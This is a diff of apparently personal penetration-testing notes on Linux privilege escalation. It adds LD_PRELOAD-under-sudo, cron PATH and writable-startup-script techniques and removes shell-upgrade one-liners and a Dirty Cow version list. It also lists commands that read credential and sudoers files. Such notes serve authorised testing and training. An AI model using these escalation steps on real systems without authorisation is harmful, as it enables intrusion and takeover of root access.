@@ -15,61 +15,6 @@ parent: Privilege Escalation
 
 ---
 
-## Upgrading Shells
-Spawning shells
-```shell
-python -c 'import pty;pty.spawn("/bin/bash")'
-```
-```shell
-echo os.system('/bin/bash')
-```
-```shell
-/bin/sh -i
-```
-
-Spawning shells and maintaining euid and groups
-```shell
-python -c 'import os,pty; os.setresuid(new_id,new_id,new_id); pty.spawn("/bin/bash")'
-```
-```c
-#include <stdio.h>
-#include <stdlib.h>
-#include <sys/types.h>
-#include <unistd.h>
-
-int main() {
-    setreuid(1001,1001);
-    setegid(1001);
-    system("/bin/sh");
-    return 0;
-}
-```
-- Without:
-    - Pre: &nbsp; `uid=1000(<u1>) gid=1000(<g1>) euid=1001(<u2>) groups=1001(<g2>),1000(<g1>)`
-    - Post: `uid=1000(<u1>) gid=1000(<g1>)                 groups=1000(<g1>)`
-- With:
-    - Pre: &nbsp; `uid=1000(<u1>) gid=1000(<g1>) euid=1001(<u2>) groups=1001(<g2>),1000(<g1>)`
-    - Post: `uid=1001(<u2>) gid=1000(<g1>)                 groups=1001(<g2>),1000(<g1>)`
-
-Pseudo terminal
-```shell
-# In reverse shell
-python -c 'import pty; pty.spawn("/bin/bash")'
-Ctrl-Z
-
-# In Kali
-stty raw -echo
-fg
-
-# In reverse shell
-reset
-export SHELL=bash
-export TERM=xterm-256color
-stty rows <rows> columns <cols>
-```
-
----
-
 ## Enumeration Scripts
 [LinEnum.sh](https://github.com/rebootuser/LinEnum)
 ```shell
@@ -92,20 +37,28 @@ unix-privesc-check {standard | detailed}
 
 ---
 
-## Daemons
-
----
-
-## Kernel
-
----
-
-## Vulnerable Software Running as Different User
-Check what software is installed and whether they have vulnerabilities
+## Daemons/Software
+Check what is installed, whether they have vulnerabilities and what user they run as
 ```shell
 dpkg -l
 yum list installed
 rpm -qa
+```
+
+---
+
+## Kernel
+Check Kernel/distribution details for patching
+
+Kernel
+```shell
+uname -a
+```
+
+Distribution details
+```shell
+cat /proc/version
+cat /etc/issue
 ```
 
 ---
@@ -207,6 +160,11 @@ void _init() {
 - Set `LD_PRELOAD` or `LD_LIBRARY_PATH` (whichever is used) to point to the .so file and run the program
 - i.e. `sudo LD_PRELOAD=<so file path> <program>`
 
+```shell
+gcc -fPIC -shared -o <output .so file> <input .c file> -nostartfiles
+sudo LD_PRELOAD=<.so file path> <program to run as sudo>
+```
+
 ---
 
 ## NFS
@@ -226,7 +184,13 @@ Exploit by mounting NFS share, placing an executable on the share as root, setti
 - System-level at /etc/crontab
 
 ### Path
-If the $PATH env var (seen within the crontab schedule file) can be redefined, you can compile a payload and place it in the identified path and wait for crontab to run the file
+Check if the `$PATH` env var has been redefined in the cron config and if we can abuse it
+```shell
+sudo -l
+cat /etc/sudoers
+```
+
+Place the payload in a location that takes precedence over the intended file
 
 ---
 
@@ -255,7 +219,7 @@ ls -l <file>
 - Files with permission of `4XXX` (SUID)
 - Files with permission of `2XXX` (SGID)
 
-#### Shared Object Notation
+#### Shared Object Injection
 - Shared object `.so` files are the Linux equivalent of Windows `.dll` files which contain reusable routines, exposed via an exports table as functions (symbols)
 - Loaded within the context of an existing process
 - Either statically or dynamically linked
@@ -263,6 +227,8 @@ ls -l <file>
 Check for missing Shared Objects
 ```shell
 strace <executable file> 2>&1 | grep -iE "open|access|no such file"
+ldd <executable file>                      # Check shared object dependencies
+objdump -x <executable file> | grep RPATH  # Check if compiled with static and abusable RPATH
 ```
 - Check if you can write to the location where the missing file should be
 
@@ -304,26 +270,26 @@ Exploit by placing the payload in a location in $PATH which precedes all other d
 ---
 
 ### Startup Scripts
+Check for writable scripts that are run on startup (within `/etc/init.d`)
+```shell
+ls -al /etc/init.d
+find / -perm -o+w -type f 2>/dev/null | grep -v '/proc\|/dev'  # World writable
+```
+
+Exploit by replacing the file with the payload
 
 ---
 
 ### Configuration Files
+Conventionally, config files are within `/etc` - check for weak file permissions/misconfigurations
+```shell
+find /etc -perm -o+w -type f 2>/dev/null  # World writable
+```
 
 ---
 
-## OS
-Distribution details
-```shell
-cat /proc/version
-cat /etc/issue
-```
-
-Kernel
-```shell
-uname -a
-```
-
-## Users
+## General Commands
+### Users
 ```shell
 id                   # Who are we?
 cat /etc/passwd      # Legacy password management?
@@ -349,7 +315,7 @@ cat /etc/ssh/*
 
 ---
 
-## Applications
+### Applications
 Running services
 ```shell
 ps -ef  # standard syntax
@@ -368,17 +334,11 @@ ls -al /var/cache/yum
 
 ---
 
-## File system
-Check home directories
-```shell
-ls -alR /root/
-ls -alR /home/
-```
-
+### File system
 Configs
 ```shell
-find /etc/ -iname *.conf -exec ls -al {} \;
-find /opt/ -iname *.conf -exec ls -al {} \;
+find /etc/ -iname *.conf -ls
+find /opt/ -iname *.conf -ls
 ```
 
 Cron jobs
@@ -459,7 +419,7 @@ cat /etc/fstab
 
 ---
 
-## Networking
+### Networking
 NIC(s) and other networks
 ```shell
 ifconfig -a
@@ -491,20 +451,7 @@ tcpdump tcp dst <ip> <port>
 
 ---
 
-## Kernel exploits
-[Dirty Cow](https://dirtycow.ninja/)
-- < 4.8.0-26.28 for Ubuntu 16.10
-- < 4.4.0-45.66 for Ubuntu 16.04 LTS
-- < 3.13.0-100.147 for Ubuntu 14.04 LTS
-- < 3.2.0-113.155 for Ubuntu 12.04 LTS
-- < 3.16.36-1+deb8u2 for Debian 8
-- < 3.2.82-1 for Debian 7
-- < 4.7.8-1 for Debian unstable 4.8
-
----
-
 ## References
 - <https://github.com/sagishahar/lpeworkshop>
 - <https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/>
 - <https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method3upgradingfromnetcatwithmagic>
-- <https://blog.pentests.pl>
